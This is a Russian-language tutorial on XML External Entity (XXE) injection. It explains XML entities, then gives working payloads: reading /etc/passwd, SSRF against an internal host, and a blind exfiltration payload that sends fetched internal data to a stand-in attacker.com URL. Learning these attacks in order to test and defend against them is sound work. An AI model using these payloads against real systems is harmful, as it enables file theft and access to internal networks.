XXE реализуется путем внедрения в XML внешних сущностей (файл сервера или URL). 
## Источники информации
- [PayloadAllTheThings XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
## Общая информация
Пример XML: 
```XML
<?xml version="1.0"?>
<!DOCTYPE xxe [
 <!ENTITY name "Вася">
]>
<note>
 <to>&name;</to>
 <from>Света</from>
 <heading>Напоминание</heading>
 <body>Позвони мне завтра!</body>
</note>
```
В примере определяется внутренняя сущности `name`, которая вставляется в содержимое через `&name;`.
Сущность может быть загружена из следующих источников:
- Сторонний ресурс:
```XML
<?xml version="1.0"?>
<!DOCTYPE to [
 <!ENTITY name SYSTEM "URL">
]>
<to>&name;</to>
```
- Файловая система ОС Linux:
```XML
<?xml version="1.0"?>
<!DOCTYPE to [
 <!ENTITY name SYSTEM "file:///filename">
]>
<to>&name;</to>
```
- Файловая система ОС Windows:
```XML
<?xml version="1.0"?>
<!DOCTYPE to [
 <!ENTITY name SYSTEM "C:\\filename">
]>
<to>&name;</to>
```
Cущности делятся на два вида: general entity и parameter entity.
General entity или обычные сущности – это сущности, оперирующие константными значениями. Пример: `<!ENTITY имя_сущности "значение">`.
Обычные сущности тоже делятся на два вида: 
- Internal или внутренние сущности работают только с теми значениями, которые описаны внутри документа. 
- External или внешние сущности необходимы для того, чтобы использовать в XML код, хранящийся в другом файле. Пример: `<!ENTITY имя_сущности SYSTEM "путь до файла">`.
Параметрические сущности (parameter entities) используются внутри DTD и позволяют подключать как внешний текст, так и дополнительные определения сущностей, содержащиеся во внешних файлах.
Пример:
```XML
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY % ent SYSTEM "http://attacker.com/entities.dtd">
 %ent;
]>
<root>
 <data>&injected;</data>
</root>
```
Файл entities.dtd содержит следующее:
```XML
<!ENTITY injected "Значение из внешнего файла">
```
После подключения `%ent;` сущность `&injected;` становится доступной в основном документе.
## Типы атак
### Чтение файлов
С помощью XXE возможно читать файлы на сервере. 
Пример:
```XML
<?xml version="1.0"?>
<!DOCTYPE test [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<note>
 <to>&xxe;</to>
</note>
```
Ограничения:
- необходим точный путь к файлу;
- файл должен быть читаемым для пользователя, под которым работает веб-сервер;
- некоторые парсеры могут иметь ограничения на длину содержимого, кэширование или обрезку вывода.
### SSRF
Уязвимый XML-парсер заставляет сервер отправить запрос по произвольному URI, включая адреса во внутренней инфраструктуре компании. 
Пример:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
 <!ENTITY xxe SYSTEM "http://internal.example.com/api/user?user_id=10">
]>
<note>
 <to>&xxe;</to>
</note>
```
В примере уязвимый сервер обращается по адресу `http://internal.example.com/api/user?user_id=10`, и, если ответ этого запроса вставляется в тело ответа, атакующий получает содержимое внутреннего ресурса.
### Blind SSRF через XXE
Иногда сервер не возвращает результат запроса в ответе (Blind SSRF), но сам запрос выполняет. В таких случаях можно использовать эксфильтрацию данных, указывая внешний адрес атакующего, чтобы получить утечку данных через DNS или HTTP.
Пример:
```XML
<?xml version="1.0"?>
<!DOCTYPE data [
 <!ENTITY % payload SYSTEM "http://internal.example.com/api">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%payload;'>">
 %payload;
 %param1;
]>
<data>&exfil;</data>
```
Уязвимый сервер обращается к API сервиса во внутренней сети, получает данные и сохраняет их в сущности. Следующим шагом осуществляется запрос на контролируемый атакующим адрес, в параметре запроса будут переданы сохраненные данные из первого запроса через переменную `%payload`.
